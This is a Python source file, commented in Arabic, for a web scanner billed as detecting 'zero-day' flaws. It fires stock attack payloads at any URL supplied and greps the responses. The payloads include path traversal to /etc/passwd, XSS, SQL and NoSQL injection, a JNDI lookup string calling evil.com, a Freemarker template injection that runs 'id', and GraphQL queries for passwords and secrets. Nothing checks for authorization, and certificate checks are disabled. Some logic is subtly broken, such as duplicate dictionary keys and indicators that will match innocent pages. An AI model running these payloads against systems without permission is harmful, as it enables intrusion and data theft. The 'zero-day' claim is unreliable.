#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة فحص ثغرات اليوم الصفري للتطبيقات الويب المتقدمة
Advanced Web Zero-Day Vulnerability Scanner

تقوم هذه الأداة باكتشاف الثغرات اليوم الصفري في التطبيقات الويب من خلال:
- اختبارات السلوك غير المعتاد
- تحليل الاستجابات للمدخلات المشبوهة
- الكشف عن التغيرات في السلوك العام للتطبيق
"""

import requests
import json
import time
import re
import hashlib
import random
import string
import sys
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor
import threading
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebZeroDayScanner:
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'WebZeroDay-Scanner/2.0 (Security Assessment)'
        })
        self.baseline_responses = {}
        
    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════════════════════╗
║        أداة فحص ثغرات اليوم الصفري للتطبيقات الويب          ║
║           Web Zero-Day Vulnerability Scanner                  ║
║                                                               ║
║   الكشف عن الثغرات غير المعروفة في التطبيقات الويب          ║
╚═══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        
    def add_finding(self, target, vulnerability_type, risk_level, description, evidence=None):
        finding = {
            "target": target,
            "vulnerability_type": vulnerability_type,
            "risk_level": risk_level,
            "description": description,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        }
        
        with self.lock:
            self.results.append(finding)
            self.print_finding(finding)
    
    def print_finding(self, finding):
        colors = {
            "CRITICAL": "\033[91m",
            "HIGH": "\033[93m",
            "MEDIUM": "\033[94m",
            "LOW": "\033[92m"
        }
        
        color = colors.get(finding["risk_level"], "")
        reset = "\033[0m"
        
        print(f"{color}[{finding['risk_level']}] {finding['vulnerability_type']} - {finding['target']}{reset}")
        print(f"الوصف: {finding['description']}")
        if finding.get("evidence"):
            print(f"الدليل: {finding['evidence']}")
        print("-" * 60)
    
    def get_baseline_response(self, url):
        """الحصول على استجابة أساسية للمقارنة"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_length': len(response.content),
                'content_hash': hashlib.md5(response.content).hexdigest()
            }
        except:
            return None
    
    def test_parameter_pollution(self, url):
        """اختبار تلوث المعاملات"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        # إنشاء معلمات مكررة
        polluted_params = {}
        for key, values in params.items():
            polluted_params[key] = values + values
        
        polluted_query = urlencode(polluted_params, doseq=True)
        polluted_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, polluted_query, parsed.fragment
        ))
        
        try:
            normal_response = self.session.get(url, timeout=10, verify=False)
            polluted_response = self.session.get(polluted_url, timeout=10, verify=False)
            
            # مقارنة الاستجابات
            if (normal_response.status_code != polluted_response.status_code or
                abs(len(normal_response.content) - len(polluted_response.content)) > 100):
                self.add_finding(
                    url, "ثغرة تلوث المعاملات", "HIGH",
                    "تم اكتشاف سلوك غير معتاد عند تكرار المعاملات",
                    f"Status: {polluted_response.status_code}, Size: {len(polluted_response.content)}"
                )
                
        except Exception:
            pass
    
    def test_http_parameter_pollution(self, url):
        """اختبار تلوث معاملات HTTP المتقدم"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        test_payloads = [
            "admin",
            "../../../etc/passwd",
            "<script>alert(1)</script>",
            "' OR 1=1--",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for payload in test_payloads:
            try:
                # اختبار مع معاملات متعددة بنفس الاسم
                params = {'test': payload, 'test': 'legit', 'test': payload}
                response = self.session.get(base_url, params=params, timeout=10, verify=False)
                
                # علامات الاستغلال
                indicators = [
                    'root:.*?:0:0:',
                    'mysql_fetch_array',
                    '<script>alert',
                    'javax.naming.CommunicationException'
                ]
                
                for indicator in indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        self.add_finding(
                            url, "ثغرة HPP متقدمة", "CRITICAL",
                            "تم اكتشاف ثغرة تلوث معاملات HTTP متقدمة",
                            f"Payload: {payload} - Indicator: {indicator}"
                        )
                        break
                        
            except Exception:
                continue
    
    def test_path_traversal(self, url):
        """اختبار تجاوز المسار المتقدم"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # اختبارات تجاوز المسار المتقدمة
        traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for payload in traversal_payloads:
            try:
                test_url = f"{base_url}/{payload}"
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # علامات نجاح التجاوز
                if 'root:x:0:0:' in response.text or 'Administrator' in response.text:
                    self.add_finding(
                        url, "ثغرة تجاوز المسار", "HIGH",
                        "تم اكتشاف ثغرة تجاوز مسار قد تكون يوم صفري",
                        f"Payload: {payload}"
                    )
                    
            except Exception:
                continue
    
    def test_server_side_template_injection(self, url):
        """اختبار حقن قوالب الخادم"""
        ssti_payloads = [
            # Jinja2 (Python)
            '{{7*7}}',
            '{{config}}',
            '{{self.__dict__}}',
            # Freemarker (Java)
            '${7*7}',
            '${"z".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}',
            # Handlebars (Node.js)
            '{{#each this}}{{this}}{{/each}}',
            '{{lookup this "constructor"}}',
            # Smarty (PHP)
            '{php}echo "test";{/php}',
            '{$smarty.version}',
            '#{7*7}'
        ]
        
        for payload in ssti_payloads:
            try:
                # اختبار في المعاملات
                params = {'name': payload, 'input': payload, 'template': payload}
                response = self.session.get(url, params=params, timeout=10, verify=False)
                
                # علامات SSTI
                indicators = [
                    '49',  # 7*7
                    'config',
                    'Runtime',
                    'smarty_version',
                    'jinja2'
                ]
                
                for indicator in indicators:
                    if indicator in response.text:
                        self.add_finding(
                            url, "ثغرة SSTI محتملة", "CRITICAL",
                            "تم اكتشاف ثغرة حقن قوالب الخادم",
                            f"Payload: {payload} - Indicator: {indicator}"
                        )
                        break
                        
            except Exception:
                continue
    
    def test_no_sql_injection(self, url):
        """اختبار حقن قواعد البيانات غير التقليدية"""
        nosql_payloads = [
            # MongoDB
            '{"$ne": null}',
            '{"$where": "this.sleep(5000)"}',
            '{"$regex": ".*"}',
            # CouchDB
            '{"startkey": [""], "endkey": ["", {}]}',
            # Redis
            '*1\r\n$4\r\nINFO\r\n',
            # Generic
            '{"$gt": ""}',
            '[{"$match": {"$expr": {"$eq": ["$admin", true]}}}]'
        ]
        
        for payload in nosql_payloads:
            try:
                headers = {'Content-Type': 'application/json'}
                response = self.session.post(
                    url, 
                    data=payload, 
                    headers=headers, 
                    timeout=10, 
                    verify=False
                )
                
                # علامات NoSQL Injection
                nosql_indicators = [
                    'mongodb',
                    'couchdb',
                    'redis_version',
                    'ObjectId',
                    '_id',
                    'find()',
                    'aggregate()'
                ]
                
                for indicator in nosql_indicators:
                    if indicator in response.text.lower():
                        self.add_finding(
                            url, "ثغرة NoSQL Injection", "HIGH",
                            "تم اكتشاف ثغرة حقن قواعد بيانات غير تقليدية",
                            f"Payload: {payload} - Indicator: {indicator}"
                        )
                        break
                        
            except Exception:
                continue
    
    def test_graphql_vulnerability(self, url):
        """اختبار ثغرات GraphQL"""
        graphql_endpoints = [
            '/graphql',
            '/graphiql',
            '/v1/graphql',
            '/api/graphql',
            '/query'
        ]
        
        introspection_query = {
            "query": "{ __schema { types { name fields { name } } } }"
        }
        
        for endpoint in graphql_endpoints:
            try:
                graphql_url = f"{url.rstrip('/')}{endpoint}"
                response = self.session.post(
                    graphql_url, 
                    json=introspection_query, 
                    timeout=10, 
                    verify=False
                )
                
                if response.status_code == 200 and '__schema' in response.text:
                    # اختبار ثغرات GraphQL المتقدمة
                    malicious_queries = [
                        '{ __schema { types { name fields { name args { name defaultValue } } } } }',
                        '{ users { password email } }',
                        '{ system { config secrets } }'
                    ]
                    
                    for query in malicious_queries:
                        try:
                            test_response = self.session.post(
                                graphql_url, 
                                json={"query": query}, 
                                timeout=10, 
                                verify=False
                            )
                            
                            if 'password' in test_response.text.lower() or 'secret' in test_response.text.lower():
                                self.add_finding(
                                    url, "ثغرة GraphQL معلومات حساسة", "HIGH",
                                    "تم اكتشاف إمكانية استخراج معلومات حساسة من GraphQL",
                                    f"Endpoint: {endpoint} - Query: {query[:50]}..."
                                )
                                break
                                
                        except Exception:
                            continue
                            
            except Exception:
                continue
    
    def test_api_version_disclosure(self, url):
        """الكشف عن إصدارات API قديمة"""
        api_versions = [
            '/api/v1',
            '/api/v2',
            '/api/v3',
            '/rest/v1',
            '/v1',
            '/v2',
            '/v3'
        ]
        
        for version in api_versions:
            try:
                api_url = f"{url.rstrip('/')}{version}"
                response = self.session.get(api_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # التحقق من إصدارات قديمة
                    server_header = response.headers.get('Server', '')
                    x_powered_by = response.headers.get('X-Powered-By', '')
                    
                    version_indicators = re.findall(r'\d+\.\d+\.\d+', response.text)
                    for version_str in version_indicators:
                        major, minor, patch = map(int, version_str.split('.'))
                        if major < 2 or (major == 2 and minor < 5):
                            self.add_finding(
                                url, "إصدار API قديم محتمل", "MEDIUM",
                                f"تم اكتشاف إصدار API قديم قد يحتوي على ثغرات",
                                f"Version: {version_str} - Endpoint: {version}"
                            )
                            break
                            
            except Exception:
                continue
    
    def scan_target(self, url):
        """فحص الهدف للكشف عن ثغرات اليوم الصفري"""
        print(f"\n[+] بدء فحص التطبيق الويب: {url}")
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # الحصول على استجابة أساسية
        baseline = self.get_baseline_response(url)
        if baseline:
            self.baseline_responses[url] = baseline
        
        # قائمة وظائف الفحص المتقدمة
        scan_functions = [
            self.test_parameter_pollution,
            self.test_http_parameter_pollution,
            self.test_path_traversal,
            self.test_server_side_template_injection,
            self.test_no_sql_injection,
            self.test_graphql_vulnerability,
            self.test_api_version_disclosure
        ]
        
        # تشغيل جميع وظائف الفحص
        for scan_func in scan_functions:
            try:
                scan_func(url)
            except Exception as e:
                print(f"خطأ في {scan_func.__name__}: {str(e)}")
                continue
    
    def save_results(self, filename=None):
        """حفظ النتائج في ملف JSON"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"web_zero_day_scan_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=2)
        
        print(f"\n[+] تم حفظ النتائج في: {filename}")
        return filename
    
    def generate_report(self):
        """توليد تقرير مختصر"""
        if not self.results:
            print("\n[+] لم يتم اكتشاف أي ثغرات محتملة في التطبيق الويب.")
            return
        
        critical = sum(1 for r in self.results if r['risk_level'] == 'CRITICAL')
        high = sum(1 for r in self.results if r['risk_level'] == 'HIGH')
        medium = sum(1 for r in self.results if r['risk_level'] == 'MEDIUM')
        low = sum(1 for r in self.results if r['risk_level'] == 'LOW')
        
        print("\n" + "="*60)
        print("              ملخص نتائج فحص التطبيق الويب")
        print("="*60)
        print(f"الثغرات الحرجة (CRITICAL): {critical}")
        print(f"الثغرات عالية الخطورة (HIGH): {high}")
        print(f"الثغرات متوسطة الخطورة (MEDIUM): {medium}")
        print(f"الثغرات منخفضة الخطورة (LOW): {low}")
        print(f"إجمالي الثغرات: {len(self.results)}")
        print("="*60)

def main():
    scanner = WebZeroDayScanner()
    scanner.print_banner()
    
    if len(sys.argv) < 2:
        print("الاستخدام: python web-zero-day-scanner.py <URL>")
        print("مثال: python web-zero-day-scanner.py http://example.com")
        sys.exit(1)
    
    urls = sys.argv[1:]
    
    for url in urls:
        scanner.scan_target(url)
    
    scanner.generate_report()
    
    # حفظ النتائج
    filename = scanner.save_results()
    
    print("\n[+] اكتمل فحص التطبيق الويب بنجاح!")
    print("[⚠️]  هذه الأداة للكشف عن المؤشرات المحتملة فقط")
    print("[⚠️]  يجب التحقق اليدوي من النتائج قبل اتخاذ أي إجراء")

if __name__ == "__main__":
    main()